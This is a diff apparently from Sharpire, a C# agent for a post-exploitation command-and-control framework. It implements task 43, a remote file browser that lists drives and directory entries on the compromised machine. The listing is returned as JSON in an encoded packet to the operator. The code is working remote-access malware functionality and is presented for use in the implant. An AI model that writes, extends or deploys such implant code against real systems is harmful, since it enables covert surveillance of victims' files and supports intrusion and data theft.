@@ -243,8 +243,7 @@ namespace Sharpire
                     case 42:
                         return Task42(packet);
                     case 43:
-                        //todo implement file browser
-                        return EncodePacket(packet.type, "Not Implimented", packet.taskId);
+                        return Task43(packet);
                     case 44:
                         return Task44(packet);
                     case 50:
@@ -491,6 +490,72 @@ namespace Sharpire
                 return EncodePacket(packet.type, "[!] Error in writing file during upload", packet.taskId);
             }
         }
+
+        public Byte[] Task43(PACKET packet)
+        {
+            string path = "/";
+            StringBuilder sb = new StringBuilder("");
+            if (packet.data.Length > 0)
+            {
+                path = packet.data;
+            }
+
+            if (path.Equals("/"))
+            {
+            // if the path is root, list drives as directories
+                sb.Append("{ \"directory_name\": \"/\", \"directory_path\": \"/\", \"items\": [");
+                DriveInfo[] allDrives = DriveInfo.GetDrives();
+                foreach (DriveInfo d in allDrives)
+                {
+                    if (d.IsReady == true)
+                    {
+                        sb.Append("{ \"path\": \"")
+                            .Append(d.Name.Replace("\\", "\\\\"))
+                            .Append("\", \"name\": \"")
+                            .Append(d.Name.Replace("\\", "\\\\"))
+                            .Append("\", \"is_file\": ")
+                            .Append("false")
+                            .Append(" },");
+                    }
+                }
+                sb.Remove(sb.Length - 1, 1);
+                sb.Append("] }");
+            }
+            else if (!Directory.Exists(path))
+            {
+                // if path doesn't exist
+                sb.Append("Directory " + path + " not found.");
+            }
+            else
+            {
+                // Process the list of files found in the directory.
+                string fullPath = Path.GetFullPath(path);
+                string[] split = fullPath.Split('\\');
+                string dirName = split[split.Length - 1];
+                sb.Append("{ \"directory_name\": \"")
+                    .Append(dirName.Replace("\\", "\\\\"))
+                    .Append("\", \"directory_path\": \"")
+                    .Append(fullPath.Replace("\\", "\\\\"))
+                    .Append("\", \"items\": [");
+                string[] fileEntries = Directory.GetFileSystemEntries(path);
+                foreach (string filePath in fileEntries)
+                {
+                    string[] split2 = filePath.Split('\\');
+                    string fileName = split2[split2.Length - 1];
+                    sb.Append("{ \"path\": \"")
+                        .Append(filePath.Replace("\\", "\\\\"))
+                        .Append("\", \"name\": \"")
+                        .Append(fileName.Replace("\\", "\\\\"))
+                        .Append("\", \"is_file\": ")
+                        .Append(File.Exists(filePath) ? "true" : "false")
+                        .Append(" },");
+            }
+            sb.Remove(sb.Length - 1, 1);
+            sb.Append("] }");
+          }
+            return EncodePacket(packet.type, sb.ToString(), packet.taskId);
+        }
+
         ////////////////////////////////////////////////////////////////////////////////
         // Excute assembly tasking
         ////////////////////////////////////////////////////////////////////////////////
